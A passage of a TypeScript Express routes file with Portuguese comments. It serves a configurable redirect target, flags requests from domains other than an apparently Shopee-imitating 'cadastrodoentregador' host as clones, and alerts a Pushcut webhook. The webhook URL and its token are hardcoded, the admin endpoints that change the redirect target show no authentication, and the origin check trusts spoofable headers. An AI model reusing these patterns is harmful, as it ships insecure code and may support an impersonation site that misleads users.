...
export async function registerRoutes(app: Express): Promise<Server> {
  ...
  // ===== API SIMPLES DE REDIRECIONAMENTO =====
  
  // API para obter destino do botão "Solicitar Kit e Finalizar"
  app.get('/api/redirect-config', async (req, res) => {
    try {
      // Verificar se o domínio atual é legítimo
      const currentHost = req.headers.origin || req.headers.referer || 'unknown';
      const isLegitimate = currentHost.includes('shopee.cadastrodoentregador.com') || 
                           currentHost.includes('localhost') || 
                           currentHost.includes('replit.dev') ||
                           currentHost.includes('127.0.0.1');
      
      // Buscar configuração no banco
      const configResult = await storage.query(`
        SELECT * FROM security_config ORDER BY id DESC LIMIT 1
      `);
      ...
      // Se não é domínio legítimo, enviar notificação
      if (!isLegitimate) {
        console.log(`[SECURITY] Site clonado detectado: ${currentHost}`);
        
        // Enviar notificação para Pushcut sobre o clone (sem aguardar)
        setImmediate(async () => {
          try {
            const pushcutUrl = 'https://api.pushcut.io/CwRJR0BYsyJYezzN-no_e/notifications/Site%20clonado%20';
            
            const notificationData = {
              text: `Site clonado detectado!`,
              title: 'Clone Alert',
              input: `Domínio: ${currentHost}\nHora: ${new Date().toLocaleString('pt-BR')}`
            };
            ...
            console.log(`[SECURITY] Notificação enviada: ${currentHost}`);
          } catch (error) {
            console.log(`[SECURITY] Erro na notificação:`, error.message);
          }
        });
      }
      
      // Sempre retornar a URL configurada (padrão: /entrega)
      res.json({
        success: true,
        target_url: config.target_url || '/entrega'
      });
  ...
  // API do painel administrativo - obter configuração atual
  app.get('/api/admin/security-config', async (req, res) => {
    try {
      const configResult = await storage.query(`
        SELECT * FROM security_config ORDER BY id DESC LIMIT 1
      `);
      ...
      console.error('[ADMIN] Erro ao obter configuração:', error);
      res.status(500).json({
        success: false,
  ...
  // API do painel administrativo - atualizar configuração
  app.post('/api/admin/security-config', async (req, res) => {
    try {
      const { redirect_enabled, target_url, legitimate_domain, pushcut_url, audit_mode } = req.body;
      ...
      await storage.query(`
        UPDATE security_config SET 
          ...
          audit_mode = $5,
          updated_at = NOW()
        WHERE id = (SELECT id FROM security_config ORDER BY id DESC LIMIT 1)
      `, [redirect_enabled, target_url, legitimate_domain, pushcut_url, audit_mode]);
      
      console.log(`[ADMIN] Configuração de segurança atualizada: redirect_enabled=${redirect_enabled}, target_url=${target_url}`);
      ...
      console.error('[ADMIN] Erro ao atualizar configuração:', error);
      res.status(500).json({
        success: false,
